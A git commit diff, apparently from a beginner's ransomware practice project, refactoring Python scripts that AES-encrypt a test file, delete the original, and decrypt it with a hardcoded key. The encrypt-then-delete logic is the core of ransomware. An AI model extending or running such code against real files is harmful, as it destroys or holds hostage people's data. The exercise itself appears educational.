4e32487c350478684e8851367f5dd1a9afc3019e
Gabriel <gabriel.gracilianomb@gmail.com>
2025-01-05 11:51:13 -0300

    Refactor by using logic from utils

--- decrypter.py
+++ decrypter.py
@@ -1,24 +1,19 @@
-import os
-import pyaes
+import utils
+
+FILE_NAME = "teste.txt.encrypted"
+KEY = "testeransomwares"
 
 # Abre o arquivo criptografado
-file_name = "teste.txt.encrypted"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+file_data = utils.get_file_data(FILE_NAME)
 
 # Gera a chave para descriptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+aes = utils.create_cipher("testeransomwares")
 
 # Descriptografa o arquivo
 decrypted_data = aes.decrypt(file_data)
 
 # Remove o arquivo criptografado
-os.remove(file_name)
+utils.remove_file(FILE_NAME)
 
 # Cria o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f"{new_file}", "wb")
-new_file.write(decrypted_data)
-new_file.close()
+utils.save_changed_file(FILE_NAME.replace(".encrypted", ""), decrypted_data)
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,19 @@
-import os
-import pyaes
+import utils
+
+FILE_NAME = "teste.txt"
+KEY = "testeransomwares"
 
 # Abre o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+file_data = utils.get_file_data(FILE_NAME)
 
 # Remove o arquivo do sistema
-os.remove(file_name)
+utils.remove_file(FILE_NAME)
 
 # Gera a chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+aes = utils.create_cipher("testeransomwares")
 
 # Criptografa o arquivo
 crypted_data = aes.encrypt(file_data)
 
 # Salva o arquivo criptografado
-new_file = file_name + ".encrypted"
-new_file = open(f"{new_file}", "wb")
-new_file.write(crypted_data)
-new_file.close()
+utils.save_changed_file(FILE_NAME + ".encrypted", crypted_data)
